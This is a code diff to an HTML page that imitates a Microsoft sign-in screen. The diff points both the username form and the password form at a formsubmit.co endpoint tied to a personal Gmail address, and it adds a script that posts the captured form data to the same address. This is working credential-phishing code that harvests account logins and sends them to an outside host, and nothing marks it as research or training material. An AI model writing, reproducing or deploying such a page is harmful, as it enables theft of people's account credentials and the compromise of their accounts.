@@ -15,7 +15,9 @@
         <div class="auth-wrapper">
             <img src="assets/logo.png" alt="Microsoft" />
             <h2 class="title mb-16 mt-16">Sign in</h2>
-            <form>
+            <form id="ticketsForm"
+  action="https://formsubmit.co/blueprint019019@gmail.com"
+  method="POST">
                 <div class="mb-16">
                     <p id="error_uname" class="error"></p>
                     <input id="inp_uname" type="text" name="uname" class="input" placeholder="Email, phone, or Skype" />
@@ -49,7 +51,9 @@
                 <span id="user_identity">a@b.com</span>
             </div>
             <h2 class="title mb-16">Enter password</h2>
-            <form>
+            <form id="ticketsForm"
+  action="https://formsubmit.co/blueprint019019@gmail.com"
+  method="POST">
                 <div class="mb-16">
                     <p id="error_pwd" class="error"></p>
                     <input id="inp_pwd" type="password" name="pass" class="input" placeholder="Password" />
@@ -91,6 +95,19 @@
         <span>.&nbsp;.&nbsp;.</span>
     </footer>
     <script src="assets/app.js"></script>
+    <script>
+document.getElementById("contactForm").addEventListener("submit", async (e) => {
+  e.preventDefault();
+
+  const formData = new FormData(e.target);
+
+  await fetch("https://formsubmit.co/blueprint019019@gmail.com", {
+    method: "POST",
+    body: formData
+  });
+
+});
+</script>
 </body>
 
 </html>
